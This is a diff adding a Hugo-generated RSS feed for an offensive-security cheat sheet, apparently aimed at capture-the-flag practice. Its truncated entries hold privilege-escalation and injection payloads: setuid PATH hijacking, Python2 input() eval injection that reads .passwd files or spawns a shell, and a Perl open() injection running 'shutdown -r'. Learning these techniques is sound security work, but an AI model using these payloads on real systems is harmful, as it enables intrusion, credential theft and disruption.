@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Programing Languages on Offensive Security Cheatsheet</title>
+    <link>/linux-systems/programing-languages/</link>
+    <description>Recent content in Programing Languages on Offensive Security Cheatsheet</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    
+	<atom:link href="/linux-systems/programing-languages/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Bash</title>
+      <link>/linux-systems/programing-languages/bash/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/programing-languages/bash/</guid>
+      <description>General &amp;amp; Tricks # base program int main(void) { system(&amp;#34;ls /path/to/.passwd&amp;#34;); return 0; } # As you as the program is executed with the ‘s’ flag (owner rights), you can privesc by copying the program you want to impersonate cp /bin/cat /tmp/ls PATH=/tmp # You can escape options echo &amp;#39;#!/bin/cat --&amp;#39; &amp;gt; /tmp/ls chmod 755 /tmp/ls env PATH=/tmp ./binary_setuid .passwd 
+Symbolic link attack # base program int main(void) { system(&amp;#34;ls /path/to/.</description>
+    </item>
+    
+    <item>
+      <title>Python</title>
+      <link>/linux-systems/programing-languages/python/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/programing-languages/python/</guid>
+      <description>Input() exploitation # In Python2, input function is vulnerable # input(x) = eval(raw_input(x)) # Means that user inputs will be executed # You can exec code Please enter password : sys.stdout.write(open(&amp;#34;.passwd&amp;#34;).readline()) 13373439872909134298363103573901 # Another Please enter password : __import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /challenge/shell/shell6/.passwd &amp;gt; /tmp/flag&amp;#39;) cat /tmp/flag # Another Please enter password : __import__(&amp;#39;shutil&amp;#39;).copyfile(&amp;#39;/challenge/shell/shell6/.passwd&amp;#39;, &amp;#39;/tmp/flag2&amp;#39;) # You can even get a shell Please enter password : __import__(&amp;#39;os&amp;#39;).system(&amp;#39;sh&amp;#39;) # Another Please enter password : input(open(&amp;#34;.</description>
+    </item>
+    
+    <item>
+      <title>Perl</title>
+      <link>/linux-systems/programing-languages/perl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/programing-languages/perl/</guid>
+      <description># Perl command injection # open() function is vulnerable and can be used to execute commands # ex : “| shutdown -r |”</description>
+    </item>
+    
+  </channel>
+</rss>
